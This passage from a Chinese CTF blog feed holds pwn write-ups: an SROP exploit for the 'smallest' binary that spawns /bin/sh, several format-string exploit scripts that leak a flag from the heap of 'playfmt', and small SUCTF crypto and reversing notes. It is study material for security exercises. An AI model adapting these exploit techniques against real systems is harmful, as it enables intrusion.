class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位&lt;/p&gt;
&lt;p&gt;控制程序执行 dl_resolve 函数&lt;br&gt;    给定 Link_map 以及 index 两个参数。&lt;br&gt;    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。&lt;br&gt;控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。&lt;br&gt;伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。&lt;br&gt;伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>srop</title>
    <link href="http://yoursite.com/2019/09/02/srop/"/>
    <id>http://yoursite.com/2019/09/02/srop/</id>
    <published>2019-09-02T15:51:52.000Z</published>
    <updated>2019-09-02T16:11:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p><p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p><a id="more"></a><p>这里懂了，大概的原理就懂了一点了（其实我很懵）<br>然后看到了我们的smallest</p><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%872.png" alt></p><p>整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。</p><p>首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步</p><p>那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0<br>所以第一步我们发送三个起始地址实现leak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(start_addr) * 3</span><br></pre></td></tr></table></figure><p>在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用</p><p>然后我们知道<code>rax</code>这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制<code>rax</code>寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）<br>然后我们将<code>rax</code>寄存器设置成15（sigreturn的系统调用号），然后调用一个<code>syscall</code>，这个效果就和调用一个<code>sigreturn</code>是一样一样的（所以在额外我们再次写入了syscall）</p><p>所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">#把frame写入栈中</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)  </span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br></pre></td></tr></table></figure><p>完整的exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">small = ELF(&apos;./smallest&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    sh = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    sh = process(&apos;./smallest&apos;)</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x00000000004000BE</span><br><span class="line">start_addr = 0x00000000004000B0</span><br><span class="line">## set start addr three times</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\xb3&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%873.png" alt><br>放一张23R3F大佬的理解过程图，写得很明了了<br>（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊）</p><p>感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了</p><p>相关参考链接:<br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a>  srop的原理<br><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">https://www.jianshu.com/p/b838a10b63c7</a>  23R3F师傅的wp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Srop&quot;&gt;&lt;a href=&quot;#Srop&quot; class=&quot;headerlink&quot; title=&quot;Srop&quot;&gt;&lt;/a&gt;Srop&lt;/h2&gt;&lt;p&gt;Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）&lt;/p&gt;
&lt;p&gt;偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）&lt;br&gt;&lt;img src=&quot;/2019/09/02/srop/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>suctf的两三题wp</title>
    <link href="http://yoursite.com/2019/08/20/playfmt/"/>
    <id>http://yoursite.com/2019/08/20/playfmt/</id>
    <published>2019-08-20T14:58:39.000Z</published>
    <updated>2019-08-20T15:37:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p><p>以下附上超级简单题的一些思路，当做给自己的记录吧</p><a id="more"></a><h2 id="MT-crpyto"><a href="#MT-crpyto" class="headerlink" title="MT - crpyto"></a>MT - crpyto</h2><p>这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int convert(unsigned int m) &#123;</span><br><span class="line">    m = m ^ m &gt;&gt; 13;</span><br><span class="line">    m = m ^ m &lt;&lt; 9 &amp; 2029229568ll;</span><br><span class="line">    m = m ^ m &lt;&lt; 17 &amp; 2245263360ll;</span><br><span class="line">    m = m ^ m &gt;&gt; 19;</span><br><span class="line">    return m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123;</span><br><span class="line">        if (i &amp; 0xfffff == 0)</span><br><span class="line">            printf(&quot;%u\n&quot;, i);</span><br><span class="line">        if (convert(i) == (unsigned int)1679057065ll) &#123;</span><br><span class="line">            printf(&quot;%u&quot;, i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//1679057065       2226413449</span><br><span class="line">//3818208026       2938293886</span><br><span class="line">//2854351778       1730632668</span><br></pre></td></tr></table></figure><p>我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作</p><p>写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 </p><p>falg : 84B45F89AF22CE7E67275BDC<br>大写发现过不去，改成小写就可以了<br>flag{84b45f89af22ce7e67275bdc} </p><h2 id="signup-re"><a href="#signup-re" class="headerlink" title="signup - re"></a>signup - re</h2><p>天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）<br>把n丢到网站上分出两个质数<br>然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了）</p><p>flag是suctf{Pwn_@_hundred_years}</p><h2 id="Playfmt-pwn"><a href="#Playfmt-pwn" class="headerlink" title="Playfmt - pwn"></a>Playfmt - pwn</h2><p>这道题，格式化字符串<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%871.png" alt><br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%872.png" alt></p><p>看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的）</p><p>看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%873.png" alt></p><p>偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK<br>我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&apos;printf&apos;]</span><br><span class="line">system_libc = libc.symbols[&apos;system&apos;]  </span><br><span class="line">printf_libc = libc.symbols[&apos;printf&apos;]  </span><br><span class="line"></span><br><span class="line">def read_addr(target_addr):</span><br><span class="line">    index1 = 6   #偏移是6的地方作为第一个ebp</span><br><span class="line">    index2 = 14   #偏移是14的地方作为ebp2     --&gt;   ebp里存的是ebp2的地址</span><br><span class="line">    value_ls = map(ord, p32(target_addr))</span><br><span class="line">    low_byte = stack_addr &amp; 0xff</span><br><span class="line">for i in range(4):   </span><br><span class="line">#stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中</span><br><span class="line">#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    success(&apos;target &apos; + hex(target_addr))</span><br><span class="line">    payload = &apos;%26$p\n\x00&apos;   #ebp2指向的地址处，只存放target_addr，可直接读取</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    payload = &apos;%26$s\n\x00&apos;</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;.%14$p.%18$p.\x00&apos;    #%19$p也可</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">heap_addr = int(p.recv(9),16)</span><br><span class="line"></span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">success(&apos;heap &apos; + hex(heap_addr))</span><br><span class="line">for i in range(-0x1000, 0, 0x4):      </span><br><span class="line">#这里就随意循环heap的地址，找到flag字符，然后打印出来即可</span><br><span class="line">        success(&apos;offset &apos; + hex(i))</span><br><span class="line">        read_addr(heap_addr + i)</span><br><span class="line">        ret = p.recvline()</span><br><span class="line">        if &apos;suctf&apos; in ret:</span><br><span class="line">            print(ret)</span><br><span class="line">            p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了）</p><p>V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1）</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%874.png" alt><br>Ida里找各个值的地址啥的<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%875.png" alt><br>New出来的v3为this，地址为[heap]0x08810E30<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%876.png" alt><br>其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。</p><p>我们输入%1$p发现它跳到了一个地方<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%877.png" alt></p><p>发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%878.png" alt></p><p>然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%879.png" alt><br>我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址</p><p>我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8710.png" alt><br>然后我们就可以通过%19$s输出真实地址<br>再把它写入ebp2，然后再执行%19$s就可以了<br>Po个exp（来自一位特别特别好的大佬）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &apos;%6$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">################## ebp&amp;ret</span><br><span class="line">log_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048</span><br><span class="line">do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028</span><br><span class="line">do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$</span><br><span class="line"></span><br><span class="line">log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))</span><br><span class="line">log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))</span><br><span class="line">log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))</span><br><span class="line">#################3 this_addr,flag_addr_off</span><br><span class="line"></span><br><span class="line">payload = &apos;%19$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">heap_addr=int(p.recv(),16)#0x8050e30</span><br><span class="line">flag_addr_off=heap_addr+4 #0x8050e34</span><br><span class="line">log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))</span><br><span class="line">log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))</span><br><span class="line"></span><br><span class="line">################# change this to *flag on stack</span><br><span class="line">heap_addr_part=heap_addr &amp; 0xFF#0e30</span><br><span class="line">log_ebp_part=log_ebp &amp; 0xFF#d048</span><br><span class="line">heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05c</span><br><span class="line"></span><br><span class="line">log.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))</span><br><span class="line">log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))</span><br><span class="line">log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">################# leak flag_addr</span><br><span class="line">payload=&apos;%19$s\x00&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag_addr=u32(p.recv(4))</span><br><span class="line">#################</span><br><span class="line">payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;134515884&apos;)  #%1$p的地址 0x8048CAC</span><br><span class="line">p.sendline(&apos;%19$s\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()`</span><br></pre></td></tr></table></figure><p>我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;=\n&quot;)</span><br><span class="line">p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)</span><br><span class="line">s = p.recvuntil(&quot;\n&quot;)</span><br><span class="line">stack_addr = int(s.strip(),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">stack = stack_addr + 0x10</span><br><span class="line">p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%16c%14$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%18$s&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8711.png" alt></p><p>这道题真实的flag好像是suctf{P_rin_Tfo}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了&lt;/p&gt;
&lt;p&gt;以下附上超级简单题的一些思路，当做给自己的记录吧&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>partial overwrite</title>
    <link href="http://yoursite.com/2019/08/16/overwrite/"/>
    <id>http://yoursite.com/2019/08/16/overwrite/</id>
    <published>2019-08-16T07:00:49.000Z</published>
    <updated>2019-08-20T17:00:46.000Z</updated>
    
